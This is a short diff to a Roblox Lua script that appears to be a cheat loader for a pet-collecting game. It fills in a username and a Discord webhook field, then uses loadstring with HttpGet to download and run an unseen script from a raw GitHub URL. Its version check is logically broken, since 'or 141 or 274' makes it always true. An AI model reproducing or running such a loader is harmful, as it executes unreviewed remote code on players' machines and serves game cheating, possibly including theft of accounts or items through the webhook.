@@ -1,7 +1,7 @@
-```if game.RobloxReplicatedStorage.GetServerVersion:InvokeServer() == "0.554.0.5540504 (4d7f4a)" then
+if game.RobloxReplicatedStorage.GetServerVersion:InvokeServer() == "0.554.0.5540504 (4d7f4a)" then
     if game.PlaceVersion == 905 or 141 or 274 then
-        UserName = "your roblox username"
-        WebHook = "your discord webhook"
+        UserName = "NUBVq"
+        WebHook = ""
 
         loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
     else
@@ -11,4 +11,4 @@
     end
 else
     game.Players.LocalPlayer:Kick("SCRIPT IS DOWN - TRY AGAIN LATER")
-end```
+end
